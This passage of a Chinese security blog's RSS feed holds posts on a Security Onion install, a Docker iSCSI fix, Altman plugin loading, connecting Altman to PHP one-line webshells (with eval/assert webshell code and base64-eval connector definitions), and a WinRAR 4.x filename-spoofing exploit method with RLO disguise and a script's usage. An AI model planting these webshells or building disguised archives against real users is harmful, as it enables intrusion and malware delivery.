data-flex-basis="369px"
>&lt;/p>
&lt;p>12.配置 logstash pipeline 批处理大小（默认）&lt;/p>
&lt;p>&lt;img src="https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-search-setup-4-set-logstash-pipeline-batch-size.webp"
width="832"
height="540"
srcset="https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-search-setup-4-set-logstash-pipeline-batch-size_hu7527669717333625377.webp 480w, https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-search-setup-4-set-logstash-pipeline-batch-size_hu5220457635045714033.webp 1024w"
loading="lazy"
alt="so-search-setup-4-set-logstash-pipeline-batch-size.webp"
class="gallery-image"
data-flex-grow="154"
data-flex-basis="369px"
>&lt;/p>
&lt;p>13.配置 logstash input 线程数（默认），如果发现存在消息积压（redis），可以适当调整以上几个参数。&lt;/p>
&lt;p>&lt;img src="https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-search-setup-5-set-logstash-input-num.webp"
width="832"
height="540"
srcset="https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-search-setup-5-set-logstash-input-num_hu3533707742632275187.webp 480w, https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-search-setup-5-set-logstash-input-num_hu13992322147373801287.webp 1024w"
loading="lazy"
alt="so-search-setup-5-set-logstash-input-num.webp"
class="gallery-image"
data-flex-grow="154"
data-flex-basis="369px"
>&lt;/p>
&lt;p>14.配置 ES 索引关闭时间（默认为 30 天）。关闭索引不会删除数据，如果需要查询历史数据可以再单独开启。如果内存足够的话，可以设置为 90 天。&lt;/p>
&lt;p>&lt;img src="https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-search-setup-6-set-days-of-indices-open.webp"
width="832"
height="540"
srcset="https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-search-setup-6-set-days-of-indices-open_hu2127256772183101375.webp 480w, https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-search-setup-6-set-days-of-indices-open_hu11203332269863253847.webp 1024w"
loading="lazy"
alt="so-search-setup-6-set-days-of-indices-open.webp"
class="gallery-image"
data-flex-grow="154"
data-flex-basis="369px"
>&lt;/p>
&lt;p>15.配置 ES 存储大小，我配置的是 1948（2T-100G），可以择优调整。&lt;/p>
&lt;p>&lt;img src="https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-search-setup-7-set-es-size.webp"
width="832"
height="540"
srcset="https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-search-setup-7-set-es-size_hu15065690066237022144.webp 480w, https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-search-setup-7-set-es-size_hu6722667189295368774.webp 1024w"
loading="lazy"
alt="so-search-setup-7-set-es-size.webp"
class="gallery-image"
data-flex-grow="154"
data-flex-basis="369px"
>&lt;/p>
&lt;p>16.等待安装完成。&lt;/p>
&lt;h2 id="功能验证">功能验证
&lt;/h2>&lt;p>1.打开 https://10.10.0.1 安全洋葱控制台并登陆&lt;/p>
&lt;p>2.点击 Grid 标签，查看网格状态，检查节点是否已经全部上线。&lt;/p>
&lt;p>&lt;img src="https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/soc-web-grid.webp"
width="1904"
height="719"
srcset="https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/soc-web-grid_hu13517050942076460227.webp 480w, https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/soc-web-grid_hu15599970276340096868.webp 1024w"
loading="lazy"
alt="soc-web-grid.webp"
class="gallery-image"
data-flex-grow="264"
data-flex-basis="635px"
>&lt;/p>
&lt;p>在这里，大家可以看到节点列表中还出现了一个陌生的节点类型 securityonion-fleet，这个是其实是独立部署的 Fleet 服务，由于需要管理的 osquery 客户端较多，容易影响性能，所以就把它从管理节点拆分出来了。&lt;/p>
&lt;p>3.点击 Alerts 标签，检查是否可以正常。&lt;/p>
&lt;p>&lt;img src="https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/soc-web-alert.webp"
width="1908"
height="942"
srcset="https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/soc-web-alert_hu1118600507770562864.webp 480w, https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/soc-web-alert_hu1640692422785295850.webp 1024w"
loading="lazy"
alt="soc-web-alert.webp"
class="gallery-image"
data-flex-grow="202"
data-flex-basis="486px"
>&lt;/p>
&lt;p>4.点击 Hunt 标签，检查是否正常。&lt;/p>
&lt;p>&lt;img src="https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/soc-web-hunt.webp"
width="1908"
height="942"
srcset="https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/soc-web-hunt_hu10686797372045258808.webp 480w, https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/soc-web-hunt_hu18100325482463080479.webp 1024w"
loading="lazy"
alt="soc-web-hunt.webp"
class="gallery-image"
data-flex-grow="202"
data-flex-basis="486px"
>&lt;/p>
&lt;p>5.点击 Grafana 标签，检查各个主机节点是否正常。&lt;/p>
&lt;p>&lt;img src="https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/soc-grafana.webp"
width="1908"
height="942"
srcset="https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/soc-grafana_hu12553169120606693109.webp 480w, https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/soc-grafana_hu5570027791764285114.webp 1024w"
loading="lazy"
alt="soc-grafana.webp"
class="gallery-image"
data-flex-grow="202"
data-flex-basis="486px"
>&lt;/p>
&lt;p>6.点击 Kiabana 标签，检查 ES 服务是否正常。&lt;/p>
&lt;p>&lt;img src="https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/soc-kibana.webp"
width="1908"
height="942"
srcset="https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/soc-kibana_hu1522686010981892835.webp 480w, https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/soc-kibana_hu14938963625343229712.webp 1024w"
loading="lazy"
alt="soc-kibana.webp"
class="gallery-image"
data-flex-grow="202"
data-flex-basis="486px"
>&lt;/p>
&lt;p>好了，如果服务一切正常的话，你可以开始打工人生活了:)&lt;/p>
&lt;h2 id="参考链接">参考链接
&lt;/h2>&lt;ul>
&lt;li>&lt;a class="link" href="https://docs.securityonion.net/en/2.3/about.html" target="_blank" rel="noopener"
>https://docs.securityonion.net/en/2.3/about.html&lt;/a>&lt;/li>
&lt;/ul></description></item><item><title>Docker环境下使用open-iscsi遇到的问题</title><link>https://www.keepwn.com/posts/using-open-iscsi-in-docker-container/</link><pubDate>Thu, 12 Nov 2015 00:00:00 +0000</pubDate><guid>https://www.keepwn.com/posts/using-open-iscsi-in-docker-container/</guid><description>&lt;p>因为有业务需求，需要在docker的容器下连接iscsi磁盘。&lt;/p>
&lt;ul>
&lt;li>部署docker镜像，安装&lt;code>open-iscsi&lt;/code>：
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">test@testpc$ docker pull ubuntu:14.04
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">test@testpc$ docker run ubuntu:14.04 apt-get install -y open-iscsi
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>进入容器，运行&lt;code>iscsiadm&lt;/code>：
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">root@aaaa# iscsiadm -m discovery -t st -p 192.168.1.10
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">iscsiadm: can not connect to iSCSI daemon &lt;span class="o">(&lt;/span>111&lt;span class="o">)&lt;/span>!
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">iscsiadm: can not connect to iSCSI daemon &lt;span class="o">(&lt;/span>111&lt;span class="o">)&lt;/span>!
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">iscsiadm: Cann perform discovery. connect to iSCSI daemon &lt;span class="o">(&lt;/span>111&lt;span class="o">)&lt;/span>!
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ul>
&lt;!-- more -->
&lt;p>初步排查原因，可能是因为找不到iscsi的驱动。该装装，该删删，结果依旧不行。&lt;/p>
&lt;p>有没有可能是docker本身的默认配置或策略问题？想到这，果然在某个docker官方文档中找到了一个参数&lt;code>privileged&lt;/code>:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">test@testpc$ docker &lt;span class="nb">help&lt;/span> run
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">...
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">--privileged&lt;span class="o">=&lt;/span>&lt;span class="nb">false&lt;/span> Give extended privileges to this container
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">...
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;em>docker容器内的root，默认情况下只是外部的一个普通用户权限，并不拥有root权限。只有使用了该参数，容器内的root才拥有真正的root权限。&lt;/em>&lt;/p>
&lt;p>尝试一下：&lt;/p>
&lt;ul>
&lt;li>使用&lt;code>privileged&lt;/code>创建一个新的容器：
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">test@testpc$ docker run --privileged --name &lt;span class="nb">test&lt;/span> -t -i ubuntu:14.04 /bin/bash
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>进入容器，运行&lt;code>iscsiadm&lt;/code>：
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">root@aaaa# iscsiadm -m discovery -t st -p 192.168.1.10
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">192.168.1.10:3260,1 iqn.1997-05.com.test:iscsi1
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ul>
&lt;p>完美解决！END&lt;/p></description></item><item><title>Altman不能成功的加载插件</title><link>https://www.keepwn.com/posts/run-app-based-on-mef-from-web/</link><pubDate>Mon, 28 Jul 2014 00:00:00 +0000</pubDate><guid>https://www.keepwn.com/posts/run-app-based-on-mef-from-web/</guid><description>&lt;p>一直有小伙伴给我反馈说：在.Net环境安装好的情况下，Altman不能自动载入插件。&lt;/p>
&lt;p>而我在测试的时候，确实发生过相似的现象，但却找不到问题所在。&lt;/p>
&lt;p>今天早些时候，在stackoverflow看到之前有人提到过&lt;a class="link" href="http://stackoverflow.com/questions/5412086/mef-based-app-works-great-on-local-machine-but-doesnt-import-addins-when-run-f" target="_blank" rel="noopener"
>类似的问题&lt;/a>，恍然大悟。&lt;/p>
&lt;p>原来，当我们从Web下载Altman程序的时候，程序集将会被添加一个新的安全属性（文件来自网络，已被锁定）。运行altman，由于loadFromRemoteSources默认属性是false，程序就无法加载这些插件dll。(在&lt;a class="link" href="http://msdn.microsoft.com/en-us/library/dd409252%28VS.100%29.aspx" target="_blank" rel="noopener"
>这里&lt;/a>有详细的说明)&lt;/p>
&lt;p>所以，解决这个问题目前有三种方法：&lt;/p>
&lt;!-- more -->
&lt;ul>
&lt;li>手动修改Plugins目录下插件的文件属性。&lt;/li>
&lt;li>在程序根目录下添加Altman.exe.config，内容如下:
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-gdscript3" data-lang="gdscript3">&lt;span class="line">&lt;span class="cl">&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">configuration&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">runtime&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">loadFromRemoteSources&lt;/span> &lt;span class="n">enabled&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;true&amp;#34;&lt;/span>&lt;span class="o">/&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">&amp;lt;/&lt;/span>&lt;span class="n">runtime&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">&amp;lt;/&lt;/span>&lt;span class="n">configuration&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>主程序将在下一个版本2.2.1中解决该问题。&lt;/li>
&lt;/ul></description></item><item><title>Altman连接phpEval与phpAssert一句话木马</title><link>https://www.keepwn.com/posts/altman-connects-phpeval-and-phpassert-shell/</link><pubDate>Thu, 10 Jul 2014 00:00:00 +0000</pubDate><guid>https://www.keepwn.com/posts/altman-connects-phpeval-and-phpassert-shell/</guid><description>&lt;p>之前测试altman工具的时候，遇到了一个问题，现解决方法如下：&lt;/p>
&lt;p>Altman连接phpEval一句话木马的时候，phpEval.type的定义如下：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">&amp;lt;customShellType&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &amp;lt;basicSetting&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &amp;lt;name&amp;gt;phpEval&amp;lt;/name&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &amp;lt;serviceExample&amp;gt;&amp;lt;![CDATA[&amp;lt;?php @eval($_POST[a])?&amp;gt;]]&amp;gt;&amp;lt;/serviceExample&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &amp;lt;mainCodeParam location=&amp;#34;Body&amp;#34; encrymode=&amp;#34;None&amp;#34; &amp;gt;passwd&amp;lt;/mainCodeParam&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &amp;lt;/basicSetting&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &amp;lt;mainCodeSetting&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &amp;lt;funcCodeParam location=&amp;#34;Body&amp;#34; encrymode=&amp;#34;Base64&amp;#34; &amp;gt;funcCode&amp;lt;/funcCodeParam&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &amp;lt;item&amp;gt;&amp;lt;![CDATA[print(&amp;#34;-&amp;gt;|&amp;#34;);
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">eval(base64_decode($_POST[$funcCode$]));
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">print(&amp;#34;|&amp;lt;-&amp;#34;);
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">die();]]&amp;gt;&amp;lt;/item&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &amp;lt;/mainCodeSetting&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&amp;lt;/customShellType&amp;gt;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;!-- more -->
&lt;p>eval函数执行php语句&lt;/p>
&lt;p>&lt;code>print(&amp;quot;-&amp;gt;|&amp;quot;);eval(base64_decode($_POST[$funcCode$]));print(&amp;quot;|&amp;lt;-&amp;quot;);die();&lt;/code>时，&lt;/p>
&lt;p>确实是正确的。&lt;/p>
&lt;p>然而当使用某些变形php一句话木马，如：&lt;/p>
&lt;p>&lt;code>&amp;lt;?php $a = &amp;quot;a&amp;quot;.&amp;quot;s&amp;quot;.&amp;quot;s&amp;quot;.&amp;quot;e&amp;quot;.&amp;quot;r&amp;quot;.&amp;quot;t&amp;quot;; $a($_POST[&amp;quot;a&amp;quot;]); ?&amp;gt;&lt;/code>&lt;/p>
&lt;p>时，&lt;/p>
&lt;p>Altman就无法连接一句话木马了。&lt;/p>
&lt;p>原因在于，这个变形木马使用的是assert函数，而eval与assert最主要区别是eval的参数可以是多个语句，而assert的参数是一个表达式。所以assert只会执行到print(&amp;quot;-&amp;gt;|&amp;quot;)代码，后面的代码则直接报错了。&lt;/p>
&lt;p>所以在了解到eval与assert的区别后，很容易写出一个新脚本类型，phpAssert.type定义如下：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">&amp;lt;customShellType&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &amp;lt;basicSetting&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &amp;lt;name&amp;gt;phpAssert&amp;lt;/name&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &amp;lt;serviceExample&amp;gt;&amp;lt;![CDATA[&amp;lt;?php @assert($_POST[a])?&amp;gt;]]&amp;gt;&amp;lt;/serviceExample&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &amp;lt;mainCodeParam location=&amp;#34;Body&amp;#34; encrymode=&amp;#34;None&amp;#34; &amp;gt;passwd&amp;lt;/mainCodeParam&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &amp;lt;/basicSetting&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &amp;lt;mainCodeSetting&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &amp;lt;funcCodeParam location=&amp;#34;Body&amp;#34; encrymode=&amp;#34;Base64&amp;#34; &amp;gt;funcCode&amp;lt;/funcCodeParam&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &amp;lt;item&amp;gt;&amp;lt;![CDATA[@eval(&amp;#34;print(&amp;#39;-&amp;gt;|&amp;#39;);&amp;#34;.base64_decode($_POST[$funcCode$]).&amp;#34;print(&amp;#39;|&amp;lt;-&amp;#39;);&amp;#34;);]]&amp;gt;&amp;lt;/item&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &amp;lt;/mainCodeSetting&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&amp;lt;/customShellType&amp;gt;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>PS:其实assert还有一个坑，那就是echo在assert中是不能直接使用的，因为在php中echo并不是一个函数:)，不能作为表达式。&lt;/p></description></item><item><title>Winrar4.x的文件欺骗漏洞利用脚本</title><link>https://www.keepwn.com/posts/file-spoofing-vulnerability-winrar4-x-scripting/</link><pubDate>Mon, 31 Mar 2014 00:00:00 +0000</pubDate><guid>https://www.keepwn.com/posts/file-spoofing-vulnerability-winrar4-x-scripting/</guid><description>&lt;h2 id="000-背景">0×00 背景
&lt;/h2>&lt;p>这几天仔细研究了winrar4.x系列的文件扩展名欺骗漏洞的那篇文章，通过一些测试对其有了一些新的想法和建议。（准确的说应该不能算文件扩展名欺骗漏，不止扩展名，整个文件名都是可以欺骗的）&lt;/p>
&lt;p>具体的漏洞成因相信文章中都很清楚了，简单说一下：&lt;/p>
&lt;p>zip格式中有2个filename，一般情况下，一般应用程序打开zip时，预览使用的是filename2，点击预览也是以filename2方式打开的，只有在解压的时候才会使用filename1。然而在winrar4.x中，点击预览是以预览filename1方式打开的。&lt;/p>
&lt;p>这会造成什么结果呢？当第一个filename为readme.exe，第二个filename为readme.txt时，用winrar4.x打开时，你在程序窗口看到的文件名为readme.txt，然后你再点击文件时却是以readme.exe方式打开，这就形成漏洞了。&lt;/p>
&lt;p>文章给出了如何利用这个bug的方法，更改filename2即可。但是作者是手动操作的，那么能不能写成利用脚本呢？这个filename2的长度有没有要求，需不需要和filename1长度相同？这正是本文要研究的。&lt;/p>
&lt;!-- more -->
&lt;h2 id="001-细节">0×01 细节
&lt;/h2>&lt;p>在研究这个问题以前，先科普一下zip格式（想看详细版的去网上下载APPNOTE.TXT）。&lt;/p>
&lt;p>zip格式由3部分组成：&lt;/p>
&lt;pre>&lt;code>1. 文件内容源数据
2. 目录源数据
3. 目录结束标识结构
&lt;/code>&lt;/pre>
&lt;p>以只压缩了一个文件的zip文件为例，大致格式为：&lt;/p>
&lt;pre>&lt;code>[file header]
[file data]
[data descriptor]
[central directory file header]
[end of central directory record]
&lt;/code>&lt;/pre>
&lt;p>其中关键的几个字段为：&lt;/p>
&lt;pre>&lt;code>[file header]:
Offset Bytes Description
18 4 Compressed size
26 2 File name length (n)
28 2 Extra field length (m)
30 n File name
30+n m Extra field
[central directory file header]:
Offset Bytes Description
28 2 File name length (n)
30 2 Extra field length (m)
34 2 File comment length (k)
[end of central directory record]:
Offset Bytes Description
12 4 Size of central directory (bytes)
16 4 Offset of start of central directory, relative to start of archive
&lt;/code>&lt;/pre>
&lt;p>在了解了zip基本格式后，我对winrar压缩生成的zip文件和用windows生成的zip文件进行了分析，它们的区别是winrar的zip文件在Extra field区段都进行了一些数据填充。&lt;/p>
&lt;p>&lt;img src="https://www.keepwn.com/posts/file-spoofing-vulnerability-winrar4-x-scripting/images/2014-03-31-img-1.webp"
width="714"
height="604"
srcset="https://www.keepwn.com/posts/file-spoofing-vulnerability-winrar4-x-scripting/images/2014-03-31-img-1_hu11053324624669041730.webp 480w, https://www.keepwn.com/posts/file-spoofing-vulnerability-winrar4-x-scripting/images/2014-03-31-img-1_hu5097817684241380601.webp 1024w"
loading="lazy"
alt="winrar压缩生成的zip文件和用windows生成的zip文件Hex对比"
class="gallery-image"
data-flex-grow="118"
data-flex-basis="283px"
>&lt;/p>
&lt;p>由于不清楚Extra field这部分的值会不会影响到winrar的校验，所以根据不同情况做了几个测试，当filename2长度改变时，并且对受filename2长度影响的所有字段（除Extra field）进行修改后，文件可以正常打开。测试结果证明Extra field的值并不会影响winrar打开zip文件。&lt;/p>
&lt;p>这样一来，只要按照zip的格式，更改和filename2有关的所有字段，就可以写出一个利用脚本了。&lt;/p>
&lt;p>等等，该文章中同时提到了，这个漏洞存在有一个限制：解压。如果你是以右键解压打开这个压缩包的话，那么只会使用filename1，和filename2无关，也就不存在这个漏洞了。作者在文章最后提到了可以利用LRO解决这个限制，那应该如何结合利用RLO呢？&lt;/p>
&lt;p>用WinHex对正常zip文件、使用了字符反转的zip文件进行分析：&lt;/p>
&lt;p>&lt;img src="https://www.keepwn.com/posts/file-spoofing-vulnerability-winrar4-x-scripting/images/2014-03-31-img-2.webp"
width="712"
height="607"
srcset="https://www.keepwn.com/posts/file-spoofing-vulnerability-winrar4-x-scripting/images/2014-03-31-img-2_hu8145645190606483187.webp 480w, https://www.keepwn.com/posts/file-spoofing-vulnerability-winrar4-x-scripting/images/2014-03-31-img-2_hu1128110296244762151.webp 1024w"
loading="lazy"
alt="正常zip文件、使用了字符反转的zip文件对比"
class="gallery-image"
data-flex-grow="117"
data-flex-basis="281px"
>&lt;/p>
&lt;p>通过对比分析可以看到，当使用含有RLO文件名的文件进行压缩时，压缩的格式有点区别，继续做了几个测试，发现winrar在Extra field添加的信息，不会影响到漏洞的利用。&lt;/p>
&lt;p>据此可以将这两个漏洞完美的结合在一起，写成一个利用脚本。&lt;/p>
&lt;p>以python为例，具体思路为：&lt;/p>
&lt;pre>&lt;code>1．生成一个带LRO的文件名的文件，并用winrar压缩为zip。在python中可以使用u'\u202e'来构造字符串反转，用os.system()函数来执行winrar命令。
2．处理zip文件中的数据，将filename2更改为自己需要定义的字符串。按照zip格式依次读取，修改filename2为新的字符串，计算出新的长度，并且修改File name length2字段，Sizeofcentraldirectory 和Offsetofstartofcentraldirectory字段，处理好它们新的偏移位置。
3．重新生成新的zip。
&lt;/code>&lt;/pre>
&lt;p>在文章最后附上完整的利用脚本WinrarExp.py&lt;/p>
&lt;p>使用方法：&lt;/p>
&lt;p>&lt;code>WinrarExp.py [-f &amp;lt;open file&amp;gt;][-s &amp;lt;forged name&amp;gt;][-v &amp;lt;reversed string&amp;gt;]&lt;/code>&lt;/p>
&lt;pre>&lt;code>-f表示要压缩的文件，比如1.exe
-s表示要伪装的文件名，比如readme.txt
-v表示需要反转的字符串，该参数为选用。比如想要文件名反转变成readmeEXE.jpg则参数只要设置为EXE.jpg
&lt;/code>&lt;/pre>
&lt;p>下载地址为：http://www.keepwn.com/files/WinrarExp.py&lt;/p></description></item></channel></rss>